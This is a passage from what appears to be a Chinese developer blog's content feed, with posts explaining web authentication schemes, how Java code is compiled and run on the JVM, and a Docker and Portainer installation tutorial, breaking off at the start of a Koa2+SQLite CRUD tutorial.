经常同时使用，它们之间存在着很多区别，这里不做详细介绍，可阅读这篇文章：<a href="https://wangxiaoxi.cn/posts/http-cookie/">Cookie和Session的区别</a>。</p><p>当然，session-cookie 鉴权方案也存在一些不足：后端服务需要大量空间来存储用户身份信息；依赖 cookie 实现，无法在禁用 cookie 的浏览器中使用，同时容易出现 CSRF 漏洞；对移动端的支持不完善……</p><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p><code>JSON Web Token</code>（<em>JWT</em>）是为在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准，一般被用来在服务端和客户端之间传递，以验证用户身份信息。</p><p><code>JWT</code> 是一个字符串，它由三部分组成：头部、载荷与签名，不同部分之间用 <code>.</code> 分隔。如果你对 JWT 的结构感兴趣，可以看看：<a href="https://jwt.io/">jwt.io</a>，这个网站提供了对 JWT 的详细介绍以及在线编码、解码 jwt 的功能。</p><p>使用 jwt 实现鉴权的一般流程如下：</p><ol><li><em>用户登认证</em><br>用户向服务器提交身份凭证，例如用户名和密码。</li><li><em>验证身份生成 jwt</em><br>服务器验证用户提交的身份凭证的有效性，如果身份凭证有效，服务器会生成一个jwt，然后携带 jwt 返回给客户端。</li><li><em>客户端存储 jwt</em><br>客户端接受到 jwt 后，将其保存在本地，之后的每次相关请求都会携带。</li><li><em>服务器验证 jwt</em><br>服务器从请求头中获取 token，然后解析出用户信息和声明信息，并根据这些信息来验证用户是否有权访问特定资源。</li></ol><p>相比传统的 session-cookie 鉴权方案，JWT 鉴权有相当多的优势：</p><ul><li>JWT 本身是无状态的，这意味着服务器不需要保存用户状态信息，节省了存储空间；</li><li>JWT 本身携带了部分用户信息，一定程度上可减轻查询数据库的需求；</li><li>JWT 不依赖于 Cookie，可以在禁用 cookie 的环境中运行，同时一定程度防止 CSRF 攻击；</li><li>JWT 体积小，传输速度快，</li><li>……</li></ul><h2 id="OAuth"><a href="#OAuth" class="headerlink" title="OAuth"></a>OAuth</h2><p>OAuth 是一个开放标准，允许用户授权第三方网站访问他们存储在另外的服务提供者上的信息，而不需要将用户名和密码提供给第三方网站或分享他们数据的所有内容。<br>这是一种很常见的鉴权方案，比如 GitHub 认证登陆。</p><p>如果想学习 OAuth2.0，参考这篇文章：<a href="https://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html">理解 OAuth 2.0</a></p><h2 id="SSO"><a href="#SSO" class="headerlink" title="SSO"></a>SSO</h2><p>单点登录（SSO）是一种身份验证服务，用户只需要登录一次，就可以访问所有相互信任的应用系统。一般运作流程如下：</p><ol><li><em>用户首次访问系统</em><br>当用户首次访问一个需要登录的应用时，该应用会发现用户未登录，然后将用户重定向到 SSO 认证中心，并将自己的地址作为参数。</li><li><em>用户在 SSO 认证中心进行登录</em><br>用户在 SSO 认证中心输入用户名和密码进行登录。如果登录成功，服务器会生成一个 ticket，并将该 ticket 追加到原始请求的 URL 参数中。</li><li><em>SSO系统进行认证</em><br>SSO 系统进行认证后，将登录状态写入 SSO 的 session，并在浏览器中写入 SSO 域下的 Cookie。</li><li><em>生成 Service Ticket</em><br>SSO 系统登录完成后会生成一个 ST（<em>Service Ticket</em>），然后跳转到原始请求的应用系统，同时将 ST 作为参数传递给该应用系统。</li><li><em>应用系统验证 ST</em><br>应用系统拿到 ST 后，从后台向 SSO 发送请求，验证 ST 是否有效。如果验证通过，应用系统将登录状态写入 session 并设置 app 域下的 Cookie。</li><li><em>访问受保护资源</em><br>此时用户可以访问原先请求的受保护资源。</li></ol><p>这就是单点登录（SSO）的工作原理和实现流程。值得注意的是，实现单点登录的关键在于如何让Session ID（或Token）在多个域中共享¹。</p><p>探究 CAS 实现单点登陆的原理，参考这篇文章：<a href="https://www.cnblogs.com/wangsongbai/p/10299655.html">一篇文章彻底弄懂CAS实现SSO单点登录原理</a></p><h2 id="PassKey"><a href="#PassKey" class="headerlink" title="PassKey"></a>PassKey</h2><p>一种新型的鉴权方式，摒弃了传统的账户密码的鉴权形式，实现无密码鉴权。</p><p>原理参考这篇文章：<a href="https://www.liaoxuefeng.com/article/1563183619768355">搞懂通行密钥</a></p>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java 运行原理</title>
      <link href="/2023/09/07/2023/how-java-run/"/>
      <url>/2023/09/07/2023/how-java-run/</url>
      
        <content type="html"><![CDATA[<p><code>Java</code> 代码从编写到运行，流程如下：</p><ol><li>Java 源程序（.java文件）经过 <em>编译器</em> 编译，变成 Java 字节码；</li><li>Java 字节码经过 <em>JVM</em> 解释执行，传递给解释器；</li><li><em>解释器</em> 将字节码翻译成合适的机器码，在机器中运行；</li></ol><p>这省略了很多细节，我想要相对详细地了解 Java 代码从编写到运行的过程中经历了什么。<br>如果你也感兴趣的话，可以接着往下看。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20230927135500.png" alt="20230927135500"></p><h2 id="前置知识-🚀"><a href="#前置知识-🚀" class="headerlink" title="前置知识 🚀"></a>前置知识 🚀</h2><h3 id="JDK-Java开发工具包"><a href="#JDK-Java开发工具包" class="headerlink" title="JDK - Java开发工具包"></a>JDK - Java开发工具包</h3><p>JDK（<em>Java Development Kit</em>）是 Java 开发工具包，提供了 Java 开发环境和运行环境。<br>JDK 包含了 JRE，同时还包含了编译器（javac）和其他开发工具，用于开发、编译、调试和运行 Java 程序。</p><h3 id="JRE-Java运行环境"><a href="#JRE-Java运行环境" class="headerlink" title="JRE - Java运行环境"></a>JRE - Java运行环境</h3><p>JRE（<em>Java Runtime Environment</em>）是 Java 运行时环境，它包含了 Java 虚拟机（JVM）以及运行 Java 程序所需的核心类库和支持文件。<br>JRE 提供了 Java 程序的运行环境，可以执行已经编译好的 Java 字节码。</p><h3 id="JVM-Java虚拟机"><a href="#JVM-Java虚拟机" class="headerlink" title="JVM - Java虚拟机"></a>JVM - Java虚拟机</h3><p>JVM（<em>Java Virtual Machine</em>）Java 程序的执行环境。JVM 介于 Java 编译器和 OS 之间，利用软件方法实现了一个虚拟的计算机，可以解释和执行 Java 字节码。<br>Java 程序在 JVM 上运行，通过 JVM 实现跨平台的特性，这是因为在不同操作系统上的 JVM 都能够执行相同的 Java 字节码。</p><h2 id="编译源代码-✒"><a href="#编译源代码-✒" class="headerlink" title="编译源代码 ✒"></a>编译源代码 ✒</h2><p>开发者主要做的是编写 Java 源文件（<em>source file</em>），通常以 <code>.java</code> 结尾。但文件中的代源码（<em>source code</em>）是给开发者阅读的，而不是机器，源文件不能直接运行。</p><p>比如，我们用 Java 编写了一段 HelloWorld 代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HelloWorld.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>💡我们使用 javac（<em>java编译器</em>，JDK中携带）编译这个源文件，将其转化以 <code>.class</code> 结尾为 Java 字节码文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac HelloWorld.java</span><br><span class="line"><span class="comment"># output: HelloWorld.class</span></span><br></pre></td></tr></table></figure><blockquote><p>编译器是一种将高级语言代码转化为低级语言代码的程序。</p></blockquote><h3 id="javac-编译-Java-源码"><a href="#javac-编译-Java-源码" class="headerlink" title="javac 编译 Java 源码"></a>javac 编译 Java 源码</h3><p>javac 将 Java 源代码作为输入，进行词法分析、语法分析和语义分析等过程，最终生成对应的字节码文件。流程如下：</p><ol><li><p><em>词法分析</em><br>  javac 首先读取源文件的字符流，并将其分解为一系列的词素（<em>token</em>）。词素是源代码中的最小语法单位，如关键字、标识符、操作符和常量等。<br>  该过程的结果是得到规范化的 token 流。</p></li><li><p><em>语法分析</em><br>  javac 对 token 流进行分析，并根据语法规则构建语法树（<em>Syntax Tree</em>）。语法树表示源代码的结构和层次关系。<br>  该过程的结果是得到一个符合 Java 语言规定的抽象语法树。</p></li><li><p><em>语义分析</em><br>  编译器对语法树进行进一步处理，检查代码是否符合语言的语义规则。它会验证变量的声明和使用、类型匹配、函数调用等语义相关的问题，并生成符号表（Symbol Table）来管理变量和函数的信息。<br>  该过程的结果是生成一个经过简化的抽象语法树，更加接近字节码。</p></li><li><p><em>字节码生成</em><br>  将经过简化的抽象语法树生成符合 JVM 规范的字节码。</p></li></ol><p>编译阶段的报错，统称为编译期错误，不会继续生成 .class 文件。</p><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>我们可以使用编译器将高级语言代码编译为低级语言代码，自然也可以使用反编译工具将已编译的代码转化为未编译的状代码</p><p>Java反编译（<em>Java Decompilation</em>）是指将 Java 字节码文件转换回 Java 源代码的过程。JDK 中与 javac 相对的反编译器是 javap，可以使用 javap 来反编译 .class 文件。<br>我们可以使用 javap 反编译刚生成的 HelloWorld.class，看看会获得什么：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javap -c HelloWorld</span><br></pre></td></tr></table></figure><p>我们可以看到反编译的结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Compiled from <span class="string">&quot;HelloWorld.java&quot;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">HelloWorld</span><span class="params">()</span>;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: aload_0</span><br><span class="line">       <span class="number">1</span>: invokespecial #<span class="number">1</span>                  <span class="comment">// Method java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">       <span class="number">4</span>: <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span>;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: getstatic     #<span class="number">7</span>                  <span class="comment">// Field java/lang/System.out:Ljava/io/PrintStream;</span></span><br><span class="line">       <span class="number">3</span>: ldc           #<span class="number">13</span>                 <span class="comment">// String Hello, World!</span></span><br><span class="line">       <span class="number">5</span>: invokevirtual #<span class="number">15</span>                 <span class="comment">// Method java/io/PrintStream.println:(Ljava/lang/String;)V</span></span><br><span class="line">       <span class="number">8</span>: <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><p>Java 源代码经过虚拟机编译器编译后产生的文件（即扩展为 .class 的文件），它不面向任何特定的处理器，只面向虚拟机。</p><h2 id="JVM-📝"><a href="#JVM-📝" class="headerlink" title="JVM 📝"></a>JVM 📝</h2><p>我们已经获得了 .class 字节码文件，来看看它是如何在 JVM 中运行。</p><h3 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h3><p>💡JVM 中的类加载器（<em>类加载子系统</em>）负责定位并加载类文件，可以分为以下三个小阶段：</p><ol><li><p><em><strong>加载 Loading</strong></em><br>  加载是类加载的第一个阶段。JVM 会根据类的全限定名（<em>Fully Qualified Name</em>）查找并读取类的字节码文件，<br>  将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构，<br>  然后在 Java 堆内存中生成一个代表这个类的 <em>java.lang.Class</em> 实例，作为方法区中这个类的各种数据的访问入口。</p></li><li><p><em><strong>链接 Linking</strong></em><br>  链接是类加载的第二个阶段。JVM 会对加载的类进行一些准备工作，包括以下三步：</p><ul><li>验证：验证字节码的正确性和安全性，检查类的结构、字段和方法的引用是否有效；</li><li>准备：为类的静态变量分配内存空间，并设置默认初始值；</li><li>解析：将符号引用转化为直接引用，即将类、字段和方法的符号引用解析为内存地址引用。</li></ul></li><li><p><em><strong>初始化 Initialization</strong></em><br>  初始化是类加载的最后一个阶段。JVM 会执行类的静态代码块并对静态变量的赋值操作。<br>  初始化阶段是类加载过程中最耗时的阶段，它需要确保类的静态资源正确初始化，并且只会执行一次。直到这一步，才会真正开始执行开发者编写的 java 代码。</p></li></ol><blockquote><p>阅读文章以了解类加载的更多内容：<a href="https://zhuanlan.zhihu.com/p/25228545">Java 类加载机制</a></p></blockquote><h3 id="执行引擎"><a href="#执行引擎" class="headerlink" title="执行引擎"></a>执行引擎</h3><p>💡执行引擎负责解释或编译字节码为机器码，并执行。</p><p>JVM 执行引擎是 JVM 核心组成部分之一。它负责将字节码指令解释&#x2F;编译为 <em>对应平台</em> 上的机器指令，这是 Java 跨平台特性的关键。</p><p><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20230927180316.png" alt="20230927180316"></p><p>执行引擎的主要有以下工作：</p><ol><li><p><em>字节码验证 Bytecode Verification</em><br>  JVM 首先会对内存中的字节码进行验证，以确保它的结构和语义是正确的。字节码验证是为了防止恶意代码或错误的字节码破坏 JVM 的安全和稳定性。</p></li><li><p><em>解释&#x2F;编译</em><br>  JVM 有两种方式将字节码转化为机器码，但通常混用：</p><ul><li><em>解释执行</em><br>   JVM 使用解释器（<em>Interpreter</em>）逐行读取字节码，并将其转换为机器码，然后由处理器执行。解释执行的优点是简单、跨平台，缺点是效率低下，因为每次执行都需要重新解释。  </li><li><em>编译执行</em><br>   JVM 使用即时编译器（<em>Just-In-Time Compiler</em>）将字节码转化为机器码，并将其缓存起来，以便下次直接执行。编译执行的优点是效率高，缺点是需要额外的编译时间和内存空间。  </li><li><em>混合模式</em><br>   为了兼顾解释执行和编译执行的优势，JVM通常会采用混合模式（Mixed Mode），即对于频繁执行的热点代码，使用编译执行，对于不常执行的冷代码，使用解释执行。这样可以提高程序的整体性能。</li></ul></li><li><p><em>执行机器码 Execution</em><br>  经过解释&#x2F;编译后，字节码被转化为平台特定的机器码。JVM 会将机器码加载到处理器中执行，实现程序的功能。</p></li></ol><p>到此，我们的 Java 源代码就经过了从编写到执行整个过程。</p><h3 id="JVM生命周期"><a href="#JVM生命周期" class="headerlink" title="JVM生命周期"></a>JVM生命周期</h3><p>JVM 在 Java 程序开始运行时运行，结束时也随之结束。</p><p>一个 Java 程序对应一个 JVM 进程。</p><p>JVM 中有两种线程：</p><ul><li><em>守护线程</em><br>JVM 自用，如垃圾回收（<em>GC</em>）</li><li><em>普通进程</em><br>一般 Java 程序的线程</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/25713880">Java JVM 运行机制及基本原理</a></li><li><a href="https://www.cnblogs.com/o-andy-o/archive/2012/04/11/2442109.html">Java 的运行原理</a></li><li><a href="https://rensifei.site/2017/03/javac/">javac 源码笔记与简单的编译原理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker基础教程</title>
      <link href="/2023/09/02/2023/docker-base/"/>
      <url>/2023/09/02/2023/docker-base/</url>
      
        <content type="html"><![CDATA[<h2 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h2><p><em>Docker</em> 是一个开源的应用容器引擎，它允许用户将他们的应用以及依赖打包到一个轻量级、可移植的容器（<em>container</em>）中，然后部署到任何环境中。</p><p>docker 由 dotCloud 公司开发维护，主要项目代码开源与 GitHub。基于 Go 开发实现，并遵循 Apache2.0 协议开源。因为 Docker 的火爆，dotCloud 公司于 2013 年改名为 Docker。</p><h2 id="与传统虚拟机的比较"><a href="#与传统虚拟机的比较" class="headerlink" title="与传统虚拟机的比较"></a>与传统虚拟机的比较</h2><p>你既然知道 docker，想必也知道虚拟机。你会发现二者的功能看起来很相似。那为什么我们会在某些场景下使用 docker，而不是传统虚拟机呢？</p><p>简单说说二者的区别：</p><p>传统的虚拟机技术是虚拟出一套硬件，然后在这套虚拟硬件上运行一个完整的操作系统，再在该操作系统上运行所需应用进程；<br>而 docker 容器的应用进程则运行于宿主内核，容器没有自己的内核，也没有进行硬件虚拟，这使得容器比传统虚拟机更加轻便。</p><p>相比于传统虚拟机技术，docker 主要有以下优点：</p><ul><li>✨ docker 不需要进行硬件虚拟以及运行完整操作系统等额外开销，对系统资源的利用率更高，允许你在同一台主机运行更多的应用；</li><li>🚀 docker 运行于宿主内核，无需启动完整的操作系统，可以实现更快的启动；</li><li>📦 只要安装了 <em>docker engine</em>，你的应用镜像可以运行在任何环境中。</li></ul><h2 id="安装-Docker"><a href="#安装-Docker" class="headerlink" title="安装 Docker"></a>安装 Docker</h2><blockquote><p>以 ubuntu22.04 系统为例</p></blockquote><p>安装一些必要的软件包，这些软件包可以让你使用 HTTPS 协议从互联网上下载软件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure><p>从 docker 的官方网站下载公钥，并添加到 apt 的信任列表中。这样做可以确保你下载的软件包是原始的，没有被篡改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | <span class="built_in">sudo</span> apt-key add -</span><br></pre></td></tr></table></figure><p>向你的系统的软件源列表中添加 docker 的官方 Ubuntu 仓库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> add-apt-repository <span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu <span class="subst">$(lsb_release -cs)</span> stable&quot;</span></span><br></pre></td></tr></table></figure><p>首先更新系统的软件包列表，然后从 docker 的官方 ubuntu 仓库中安装Docker CE，Docker CLI 和 containerd.io。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update &amp;&amp; <span class="built_in">sudo</span> apt install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>检查 docker 服务的状态，确认是否已经成功安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl status docker</span><br></pre></td></tr></table></figure><p>同时，你可以使用以下指令设置 docker 每次开机自启动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure><p>使用以下指令关闭 docker 开机自启动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">disable</span> docker</span><br></pre></td></tr></table></figure><p>重启 docker 服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> systemctl restart docker</span><br></pre></td></tr></table></figure><p>默认情况下，只有 root 用户有权利执行 docker 指令，这确保了安全，但有些用户可能认为多此一举。执行以下命令将当前用户添加到 docker 用户组，重新登陆后我们即可使用当前用户身份执行 docker 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> usermod -aG docker <span class="variable">$USER</span></span><br></pre></td></tr></table></figure><p>都搞定后，执行以下命令运行一个测试容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker container run hello-world</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出现以下输出，代表 docker 功能正常。</span></span><br><span class="line"><span class="comment"># Hello from Docker!</span></span><br><span class="line"><span class="comment"># This message shows that your installation appears to be working correctly.</span></span><br></pre></td></tr></table></figure><p>关于如何卸载 docker，其实用的不多，但也可以记录一手。</p><p>停止所有正在运行的容器以及所有的 docker 对象：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker container stop $(docker container <span class="built_in">ls</span> -aq)</span><br><span class="line">docker system prune -a --volumes</span><br></pre></td></tr></table></figure><p>使用 apt 卸载 docker 以及相关依赖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt purge docker-ce &amp;&amp; <span class="built_in">sudo</span> apt autoremove</span><br></pre></td></tr></table></figure><h2 id="安装-Docker-Compose"><a href="#安装-Docker-Compose" class="headerlink" title="安装 Docker Compose"></a>安装 Docker Compose</h2><p><code>docker compose</code> 是一个用于定义和运行多容器 Docker 应用程序的工具。</p><p>从官方仓库拉取最新版本并安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> curl -L <span class="string">&quot;https://github.com/docker/compose/releases/latest/download/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>为 docker-compose 添加执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure><p>输出版本信息检查是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h2 id="docker-换源"><a href="#docker-换源" class="headerlink" title="docker 换源"></a>docker 换源</h2><p>docker 默认镜像源在国外，出于某些原因，我们拉取镜像可能会非常慢。这太痛苦了。我们可以修改 <code>/etc/docker/daemon.json</code> 文件，以修改镜像源：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure><p>添加国内源：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;registry-mirrors&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;https://docker.m.daocloud.io/&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>保存后退出，重启 docker 服务。换源完成。</p><blockquote><p>不同源也是存在区别的，使用前一定要注意。参考这篇教程：<a href="https://gist.github.com/y0ngb1n/7e8f16af3242c7815e7ca2f0833d3ea6">Docker Hub 镜像加速器</a></p></blockquote><h2 id="安装-Portainer"><a href="#安装-Portainer" class="headerlink" title="安装 Portainer"></a>安装 Portainer</h2><p>使用命令行管理少数 docker 容器可能挺方便，可要是容器多起来就会变得繁琐，且命令行中的数据也不够直观。<br>我们可以使用一些可视化工具提高我们的效率。</p><p><code>Portainer</code> 是一款轻量级的 docker 管理工具，我们可以使用它管理我们的docker 镜像容器。<br><img src="https://agu-img.oss-cn-hangzhou.aliyuncs.com/blog/20230924232212.png" alt="Portainer运行页面展示"></p><p>拉取 portainer 镜像到本地并部署，这样我们就可以在浏览器中访问 portainer 服务，管理本地镜像和容器。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker pull portainer/portainer-ce</span><br></pre></td></tr></table></figure><p>使用以下指令，使用 <code>portainer/portainer-ce</code> 镜像创建一个运行在本地 9000 端口的镜像。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v /dockerData/portainer:/data --restart=always --name portainer portainer/portainer</span><br></pre></td></tr></table></figure><p>创建成功后，访问 <a href="http://localhost:9000/">localhost:9000</a> 的 portainer 服务，按照指引进行一些基本配置，我们就可以方便快捷的管理我们的镜像和容器了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://yeasy.gitbook.io/docker_practice/introduction/why">Docker - 从入门到实践</a></li><li><a href="https://www.runoob.com/docker/docker-command-manual.html">Docker 常用指令</a></li><li><a href="https://github.com/portainer/portainer">Portainer - github</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Development </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于Koa2+SQLite快速构建CRUD API</title>
      <link href="/2023/08/22/2023/koa2-crud-example/"/>
      <url>/2023/08/22/2023/koa2-crud-example/</url>
      
        <content type="html"><![CDATA[<p>暑期的尾声渐近，创新实践课的老师突然要验收暑期学习成果，愚蠢的阿菇对此事完全没有印象……毫无准备的他决定临时搓个小东西出来。前端肯定是要用 React 来做，后端嘛……思来想去，准备学习 koa 现学现卖一下。之前没用 node.js 写过后端，想尝试尝试新东西，单纯为了补作业而写东西感觉不值……</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>先了解一些基本概念。</p><h3 id="koa"><a href="#koa" class="headerlink" title="koa"></a>koa</h3><p><code>koa</code> 是一个基于 Node.js 的 Web 开发框架，提供了一种<strong>简洁优雅</strong>的方式来处理 HTTP 请求和响应。我个人觉得 koa 就是精简版的 Express，删减了路由、视图渲染等多种功能，同时在中间件以及异步处理等方面进行了一些优化。</p><p>可以去 <a href="https://www.koajs.com.cn/">👋koa 官网</a> 进一步了解。但官网阅读起来比较难受，目录不是很好，但一手文档的参考简直自然是没得说。</p><p>如果只想要快速上手 koa 开发，阿菇更推荐下面这个教程：</p><p><a href="https://chenshenhai.github.io/koa2-note/">《Koa3 进阶学习笔记》</a></p><h3 id="sqlite"><a href="#sqlite" class="headerlink" title="sqlite"></a>sqlite</h3><p><code>sqlite</code> 是一个嵌入式 SQL 数据库引擎，它提供了一种简单、轻量级且独立的方法来存储和管理数据。它不需要单独的服务器进程，可以直接在应用程序中使用。它不像 MySQL 那么笨重，轻便到你只需要在你的项目中留有一个 sqlite.db 即可，对初学者来说省去了很多配置环境的麻烦（阿菇首次接触到的数据库就是 sqlite）。</p><h2 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h2><p><code>MVC</code> 是一个最基本的核心架构知识，以后会经常用到。你是离不开它的🤗。</p><p><img src="https://agu-images.oss-cn-hangzhou.aliyuncs.com/test/image-20230828212321994.png" alt="MVC架构图"></p><p>MVC 模式，全称为 Model-View-Controller（模型-视图-控制器）模式，它是一种软件架构模式，其目标是将软件的用户界面（即前台页面）和业务逻辑分离，使代码具有更高的可扩展性、可复用性、可维护性以及灵活性。</p><p>具体到代码层面，MVC 将应用程序分为三个主要部分：模型（Model）、视图（View）和控制器（Controller）。Model 负责数据的存储和处理，Controller 负责业务逻辑的处理和协调，View 负责数据的可视化呈现给用户。</p><p>MVC 模式的优势在于分离关注点、提高代码的可重用性和可维护性。通过将应用程序分成模型、视图和控制器，实现更好地组织代码、降低模块之间的耦合度，并提供了良好的扩展性和可测试性。</p><p>除了 MVC，还有其他一些常见的架构模式，这里不做展开介绍😜，感兴趣的请自行前往以下链接了解：</p><ul><li><a href="https://zh.wikipedia.org/wiki/Model-view-presenter">MVP模式（Model-View-Presenter）</a></li><li><a href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel">MVVM模式（Model-View-ViewModel）</a></li></ul><h2 id="实战场景概括"><a href="#实战场景概括" class="headerlink" title="实战场景概括"></a>实战场景概括</h2><p>在接下来的实战中，我们会实现一个 <code>users</code> 表，包括 id、username 和 password 三个列，并基于这个表使用 koa 以及相关库实现 crud api 接口，并在完成后使用 <code>postman</code> 工具进行测试。</p><p>不想听我啰嗦的可以直接去看 GitHub 项目地址：</p><p><a href="https://github.com/ma5hr00m/koa2-crud-example">koa2-crud-example</a></p><h2 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h2><p>常用的 koa 语法前往官网自行了解 👉<a href="https://www.koajs.com.cn/#application">Koa 中文网</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 